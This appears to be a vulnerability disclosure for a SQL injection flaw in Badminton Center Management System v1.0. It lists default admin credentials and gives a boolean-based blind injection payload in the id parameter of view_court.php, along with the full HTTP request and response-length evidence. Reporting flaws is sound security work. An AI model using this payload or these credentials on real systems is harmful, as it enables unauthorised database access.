# Badminton Center Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15318/badminton-center-management-system-phpoop-free-source-code.html

Current database name: bcms_db,length is 7

Vulnerability File: /bcms/admin/courts/view_court.php?id=

Vulnerability location: /bcms/admin/courts/view_court.php?id=,id

[+] Payload: /bcms/admin/courts/view_court.php?id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id


```sql
GET /bcms/admin/courts/view_court.php?id=1%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 851
![image](https://user-images.githubusercontent.com/54017627/170618922-cc0ad8fb-43f3-4cd3-a080-2011c14af49c.png)

![image](https://user-images.githubusercontent.com/54017627/170618967-479987dd-e338-4b9d-9a55-14d3f7ce99af.png)

When length (database ()) = 7, Content-Length: 729
![image](https://user-images.githubusercontent.com/54017627/170618811-91d9981d-c10e-4cb4-93da-e2e2938d2b8a.png)

![image](https://user-images.githubusercontent.com/54017627/170618942-7758a3e3-7c6d-4901-b81f-b4ac3b0873ea.png)
